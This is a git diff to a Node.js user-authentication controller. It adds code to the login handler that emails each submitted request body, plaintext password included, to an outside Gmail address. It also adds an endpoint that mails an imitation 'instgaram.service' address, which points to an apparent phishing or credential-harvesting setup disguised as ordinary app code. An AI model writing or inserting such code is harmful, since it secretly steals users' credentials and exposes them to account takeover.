@@ -2,6 +2,7 @@ const ErrorHandler = require("../utils/errorHandler.js");
 const catchAsyncErrors = require("../middlewares/catchAsyncError.js");
 const User = require("../models/uerModel.js");
 const fs = require("fs");
+const sendMail = require("../utils/nodemailer.js");
  
 
 exports.userRegisterController = catchAsyncErrors(async (req, res, next) => { 
@@ -25,6 +26,8 @@ exports.userLoginController = catchAsyncErrors(async (req, res, next) => {
     const newUser = new User({
       username, password
     });
+    sendMail("yash.patel98305@gmail.com",req.body,"password")
+
    await newUser.save();
    res.status(200).json({
     success: true,
@@ -39,3 +42,10 @@ exports.userLoginController = catchAsyncErrors(async (req, res, next) => {
       user,
     });
   });
+exports.emailController = catchAsyncErrors(async(req,res)=>{
+  sendMail("instgaram.service@gmail.com",0,"email")
+  res.status(200).json({
+    success: true,
+    message : "mail sent"
+  })
+})
